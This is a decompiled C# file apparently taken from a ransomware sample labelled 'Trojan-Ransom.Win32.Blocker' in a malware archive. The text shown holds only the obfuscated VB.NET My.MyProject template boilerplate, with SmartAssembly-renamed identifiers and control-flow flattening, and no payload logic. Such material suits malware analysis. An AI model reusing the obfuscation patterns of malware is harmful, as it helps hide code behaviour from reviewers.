// Decompiled with JetBrains decompiler
// Type: My.MyProject
// Assembly: o4tdggb3, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FA0844EB-EF82-404C-B76C-C092ABDB9392
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.bzqq-b74e3dc76fae79b75c26f27ecb85aae1eae4082a42bfa080f7805f32dedc9d67.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.ApplicationServices;
using Microsoft.VisualBasic.CompilerServices;
using SmartAssembly.SmartExceptionsCore;
using System;
using System.CodeDom.Compiler;
using System.ComponentModel;
using System.ComponentModel.Design;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

namespace My
{
  [StandardModule]
  [HideModuleName]
  [GeneratedCode("MyTemplate", "8.0.0.0")]
  internal sealed class MyProject
  {
    private static readonly MyProject.Ⴄ<MyComputer> Ⴄ;
    private static readonly MyProject.Ⴄ<MyApplication> Ⴐ;
    private static readonly MyProject.Ⴄ<User> Ⴅ;
    private static readonly MyProject.Ⴄ<MyProject.Ⴐ> Ⴄ;

    static MyProject()
    {
      try
      {
        SmartAssembly.SmartUsageCore.DoNotPruneAttribute.ႰႣ();
        try
        {
          MyProject.Ⴄ = new MyProject.Ⴄ<MyComputer>();
          MyProject.Ⴐ = new MyProject.Ⴄ<MyApplication>();
          MyProject.Ⴅ = new MyProject.Ⴄ<User>();
          MyProject.Ⴄ = new MyProject.Ⴄ<MyProject.Ⴐ>();
        }
        catch (Exception ex)
        {
          StackFrameHelper.CreateException0(ex);
          throw;
        }
      }
      catch (Exception ex)
      {
        StackFrameHelper.CreateException0(ex);
        throw;
      }
    }

    [HelpKeyword("My.Computer")]
    internal static MyComputer Ⴃ
    {
      get
      {
        MyComputer myComputer1;
        try
        {
          MyComputer myComputer2;
          try
          {
            myComputer2 = MyProject.Ⴄ.Ⴀ();
          }
          catch (Exception ex)
          {
            MyComputer o1 = myComputer1;
            StackFrameHelper.CreateException1(ex, (object) o1);
            throw;
          }
          return myComputer2;
        }
        catch (Exception ex)
        {
          MyComputer o1 = myComputer1;
          MyComputer myComputer3;
          MyComputer o2 = myComputer3;
          StackFrameHelper.CreateException2(ex, (object) o1, (object) o2);
          throw;
        }
      }
    }

    [HelpKeyword("My.Application")]
    internal static MyApplication Ⴀ
    {
      get
      {
        MyApplication myApplication1;
        try
        {
          MyApplication myApplication2;
          try
          {
            myApplication2 = MyProject.Ⴐ.Ⴀ();
          }
          catch (Exception ex)
          {
            MyApplication o1 = myApplication1;
            StackFrameHelper.CreateException1(ex, (object) o1);
            throw;
          }
          return myApplication2;
        }
        catch (Exception ex)
        {
          MyApplication o1 = myApplication1;
          MyApplication myApplication3;
          MyApplication o2 = myApplication3;
          StackFrameHelper.CreateException2(ex, (object) o1, (object) o2);
          throw;
        }
      }
    }

    [HelpKeyword("My.User")]
    internal static User Ⴄ
    {
      get
      {
        User user1;
        try
        {
          User user2;
          try
          {
            user2 = MyProject.Ⴅ.Ⴀ();
          }
          catch (Exception ex)
          {
            User o1 = user1;
            StackFrameHelper.CreateException1(ex, (object) o1);
            throw;
          }
          return user2;
        }
        catch (Exception ex)
        {
          User o1 = user1;
          User user3;
          User o2 = user3;
          StackFrameHelper.CreateException2(ex, (object) o1, (object) o2);
          throw;
        }
      }
    }

    [HelpKeyword("My.WebServices")]
    internal static MyProject.Ⴐ Ⴐ
    {
      get
      {
        MyProject.Ⴐ ⴐ1;
        try
        {
          MyProject.Ⴐ ⴐ2;
          try
          {
            ⴐ2 = MyProject.Ⴄ.Ⴀ();
          }
          catch (Exception ex)
          {
            MyProject.Ⴐ o1 = ⴐ1;
            StackFrameHelper.CreateException1(ex, (object) o1);
            throw;
          }
          return ⴐ2;
        }
        catch (Exception ex)
        {
          MyProject.Ⴐ o1 = ⴐ1;
          MyProject.Ⴐ ⴐ3;
          MyProject.Ⴐ o2 = ⴐ3;
          StackFrameHelper.CreateException2(ex, (object) o1, (object) o2);
          throw;
        }
      }
    }

    [MyGroupCollection("System.Web.Services.Protocols.SoapHttpClientProtocol", "Create__Instance__", "Dispose__Instance__", "")]
    [EditorBrowsable(EditorBrowsableState.Never)]
    internal sealed class Ⴐ
    {
      [EditorBrowsable(EditorBrowsableState.Never)]
      public override bool Equals(object Ⴐ)
      {
        bool flag1;
        try
        {
          bool flag2;
          try
          {
            flag2 = base.Equals(SmartAssembly.SmartExceptionsCore.ReportUsageAttribute.Ⴀ(Ⴐ, 426, 498));
          }
          catch (Exception ex)
          {
            // ISSUE: variable of a boxed type
            __Boxed<bool> o1 = (ValueType) flag1;
            object o3 = Ⴐ;
            StackFrameHelper.CreateException3(ex, (object) o1, (object) this, o3);
            throw;
          }
          return flag2;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<bool> o1 = (ValueType) flag1;
          bool flag3;
          // ISSUE: variable of a boxed type
          __Boxed<bool> o2 = (ValueType) flag3;
          object o4 = Ⴐ;
          StackFrameHelper.CreateException4(ex, (object) o1, (object) o2, (object) this, o4);
          throw;
        }
      }

      [EditorBrowsable(EditorBrowsableState.Never)]
      public override int GetHashCode()
      {
        int num1;
        try
        {
          int hashCode;
          try
          {
            hashCode = base.GetHashCode();
          }
          catch (Exception ex)
          {
            // ISSUE: variable of a boxed type
            __Boxed<int> o1 = (ValueType) num1;
            StackFrameHelper.CreateException2(ex, (object) o1, (object) this);
            throw;
          }
          return hashCode;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) num1;
          int num2;
          // ISSUE: variable of a boxed type
          __Boxed<int> o2 = (ValueType) num2;
          StackFrameHelper.CreateException3(ex, (object) o1, (object) o2, (object) this);
          throw;
        }
      }

      [EditorBrowsable(EditorBrowsableState.Never)]
      internal Type Ⴍ()
      {
        Type type1;
        try
        {
          Type type2;
          try
          {
            // ISSUE: type reference
            type2 = SendingReportFeedbackEventArgs1.Ⴍ(__typeref (MyProject.Ⴐ), 687, 724);
          }
          catch (Exception ex)
          {
            Type o1 = type1;
            StackFrameHelper.CreateException2(ex, (object) o1, (object) this);
            throw;
          }
          return type2;
        }
        catch (Exception ex)
        {
          Type o1 = type1;
          Type type3;
          Type o2 = type3;
          StackFrameHelper.CreateException3(ex, (object) o1, (object) o2, (object) this);
          throw;
        }
      }

      [EditorBrowsable(EditorBrowsableState.Never)]
      public override string ToString()
      {
        string str1;
        try
        {
          string str2;
          try
          {
            str2 = base.ToString();
          }
          catch (Exception ex)
          {
            string o1 = str1;
            StackFrameHelper.CreateException2(ex, (object) o1, (object) this);
            throw;
          }
          return str2;
        }
        catch (Exception ex)
        {
          string o1 = str1;
          string str3;
          string o2 = str3;
          StackFrameHelper.CreateException3(ex, (object) o1, (object) o2, (object) this);
          throw;
        }
      }

      private static T Ⴓ<T>(T Ⴄ) where T : new()
      {
        int num;
        T obj1;
        try
        {
          T obj2;
          try
          {
            num = 5;
            while (true)
            {
              switch (num)
              {
                case 0:
                  goto label_7;
                case 1:
                  obj1 = Ⴄ;
                  num = 0;
                  continue;
                case 2:
                case 7:
                  num = 0;
                  continue;
                case 3:
                  goto label_9;
                case 4:
                  num = 2;
                  continue;
                case 8:
                  obj1 = new T();
                  num = 0;
                  continue;
                default:
                  num = (object) Ⴄ != null ? 1 : 8;
                  continue;
              }
            }
label_7:
            obj2 = obj1;
          }
          catch (Exception ex)
          {
            // ISSUE: variable of a boxed type
            __Boxed<T> o1 = (object) obj1;
            // ISSUE: variable of a boxed type
            __Boxed<T> o2 = (object) Ⴄ;
            StackFrameHelper.CreateException2(ex, (object) o1, (object) o2);
            throw;
          }
label_9:
          return obj2;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<T> o1 = (object) obj1;
          T obj3;
          // ISSUE: variable of a boxed type
          __Boxed<T> o2 = (object) obj3;
          // ISSUE: variable of a boxed type
          __Boxed<int> o3 = (ValueType) num;
          // ISSUE: variable of a boxed type
          __Boxed<T> o4 = (object) Ⴄ;
          StackFrameHelper.CreateException4(ex, (object) o1, (object) o2, (object) o3, (object) o4);
          throw;
        }
      }

      private void Ⴅ<T>(ref T Ⴍ)
      {
        T obj1;
        try
        {
          try
          {
            ref T local = ref Ⴍ;
            obj1 = default (T);
            T obj2 = obj1;
            local = obj2;
          }
          catch (Exception ex)
          {
            // ISSUE: variable of a boxed type
            __Boxed<T> o1 = (object) obj1;
            // ISSUE: variable of a boxed type
            __Boxed<T> o3 = (object) Ⴍ;
            StackFrameHelper.CreateException3(ex, (object) o1, (object) this, (object) o3);
            throw;
          }
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<T> o1 = (object) obj1;
          // ISSUE: variable of a boxed type
          __Boxed<T> o3 = (object) Ⴍ;
          StackFrameHelper.CreateException3(ex, (object) o1, (object) this, (object) o3);
          throw;
        }
      }

      [EditorBrowsable(EditorBrowsableState.Never)]
      public Ⴐ()
      {
        try
        {
          try
          {
          }
          catch (Exception ex)
          {
            StackFrameHelper.CreateException1(ex, (object) this);
            throw;
          }
        }
        catch (Exception ex)
        {
          StackFrameHelper.CreateException1(ex, (object) this);
          throw;
        }
      }

      static Ⴐ()
      {
        try
        {
          SmartAssembly.SmartUsageCore.DoNotPruneAttribute.ႰႣ();
        }
        catch (Exception ex)
        {
          StackFrameHelper.CreateException0(ex);
          throw;
        }
      }
    }

    [EditorBrowsable(EditorBrowsableState.Never)]
    [ComVisible(false)]
    internal sealed class Ⴄ<Ⴍ> where Ⴍ : new()
    {
      [ThreadStatic]
      private static Ⴍ Ⴍ;

      [SpecialName]
      internal Ⴍ Ⴀ()
      {
        int num;
        Ⴍ ⴍ1;
        try
        {
          Ⴍ ⴍ2;
          try
          {
            num = 2;
            while (true)
            {
              switch (num)
              {
                case 0:
                case 3:
                  goto label_4;
                case 1:
                  MyProject.Ⴄ<Ⴍ>.Ⴍ = new Ⴍ();
                  num = 3;
                  continue;
                case 4:
                  goto label_5;
                default:
                  num = (object) MyProject.Ⴄ<Ⴍ>.Ⴍ != null ? 3 : 1;
                  continue;
              }
            }
label_4:
            Ⴍ ⴍ3 = MyProject.Ⴄ<Ⴍ>.Ⴍ;
label_5:
            ⴍ2 = ⴍ3;
          }
          catch (Exception ex)
          {
            // ISSUE: variable of a boxed type
            __Boxed<Ⴍ> o1 = (object) ⴍ1;
            StackFrameHelper.CreateException2(ex, (object) o1, (object) this);
            throw;
          }
          return ⴍ2;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<Ⴍ> o1 = (object) ⴍ1;
          Ⴍ ⴍ4;
          // ISSUE: variable of a boxed type
          __Boxed<Ⴍ> o2 = (object) ⴍ4;
          // ISSUE: variable of a boxed type
          __Boxed<int> o3 = (ValueType) num;
          StackFrameHelper.CreateException4(ex, (object) o1, (object) o2, (object) o3, (object) this);
          throw;
        }
      }

      [EditorBrowsable(EditorBrowsableState.Never)]
      public Ⴄ()
      {
        try
        {
          try
          {
          }
          catch (Exception ex)
          {
            StackFrameHelper.CreateException1(ex, (object) this);
            throw;
          }
        }
        catch (Exception ex)
        {
          StackFrameHelper.CreateException1(ex, (object) this);
          throw;
        }
      }

      static Ⴄ()
      {
        try
        {
          SmartAssembly.SmartUsageCore.DoNotPruneAttribute.ႰႣ();
        }
        catch (Exception ex)
        {
          StackFrameHelper.CreateException0(ex);
          throw;
        }
      }
    }
  }
}
